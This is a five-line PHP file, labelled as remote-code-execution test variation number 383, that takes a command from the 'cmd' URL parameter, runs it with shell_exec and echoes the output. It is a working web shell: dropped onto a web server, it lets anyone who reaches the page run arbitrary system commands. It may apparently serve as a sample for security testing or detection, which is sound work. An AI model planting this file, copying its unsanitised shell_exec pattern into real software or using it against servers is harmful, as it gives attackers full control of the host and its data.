<?php
// RCE test variation #383
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>